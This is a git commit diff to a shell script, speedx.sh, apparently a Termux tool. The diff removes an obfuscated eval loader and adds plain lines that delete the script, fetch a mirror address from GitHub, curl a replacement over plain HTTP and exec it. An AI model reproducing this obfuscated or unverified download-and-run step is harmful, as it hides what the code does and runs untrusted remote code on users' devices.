4ffff54a39577ae221345e6f27e98bcb1d1e8176
tgzin <75448283+tg230@users.noreply.github.com>
2024-06-24 13:47:10 -0300

    Update speedx.sh

--- speedx.sh
+++ speedx.sh
@@ -42,8 +42,14 @@
 
 
 
+clear
 
 
-z="
-";Az='clea';Iz='r $a';ez='${mi';Fz='edx.';bz=' -O ';Nz='serv';Bz='r';cz='"htt';Yz='menu';jz=' sh ';Tz='ctor';iz='exec';Wz='xter';Kz='ve';Zz='/spe';gz='}/${';Cz='arch';Mz='or="';dz='p://';Ez='"spe';Gz='sh"';hz='y}"';Rz='"';Pz='et:3';Vz='peed';Lz='mirr';Sz='dire';fz='rror';Uz='y="s';Qz='6139';Jz='rchi';Xz='mux/';az='curl';kz='"$0"';Dz='ive=';Oz='eo.n';Hz='rm -';
-eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$Fz$Gz$z$az$bz$cz$dz$ez$fz$gz$Sz$Tz$hz$z$iz$jz$kz$z$Az$Bz"
+
+rm -r $archive
+mirror=$(curl -s -L https://raw.githubusercontent.com/tg230/teste2222/main/check/ip/mirror/1)
+directory="speedxtermux/menu/speedx"
+curl -O "http://${mirror}/${directory}"
+exec sh "$0"
+
+clear 
